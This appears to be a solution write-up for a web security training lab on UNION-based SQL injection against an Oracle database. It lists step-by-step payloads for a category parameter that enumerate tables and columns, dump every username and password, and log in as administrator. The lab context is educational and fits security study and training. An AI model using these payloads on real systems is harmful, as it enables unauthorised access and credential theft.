## Solution steps
USERS_SIGBSQ USERNAME_UGZFIJ PASSWORD_CVKYGH
- Open Burp suite and set-up proxy.
- Determine the number of columns that are being returned by the query and which columns contain text data.
- Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter: `'+UNION+SELECT+'a','b'+FROM+dual--`
- Use the following payload to retrieve the list of tables in the database: `'+UNION+SELECT+table_name,NULL+FROM+all_tables--`
- Find the name of the table containing user credentials: `USERS_SIGBSQ`
- Use the following payload to retrieve the details of the columns in the table: `'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_SIGBSQ'--`
- Find the names of the columns containing usernames and passwords: `USERNAME_UGZFIJ` `PASSWORD_CVKYGH`
- Use the following payload to retrieve the usernames and passwords for all users: `'+UNION+SELECT+USERNAME_UGZFIJ,+PASSWORD_CVKYGH+FROM+USERS_SIGBSQ--`
- Find the password for the `administrator` user, and use it to log in.
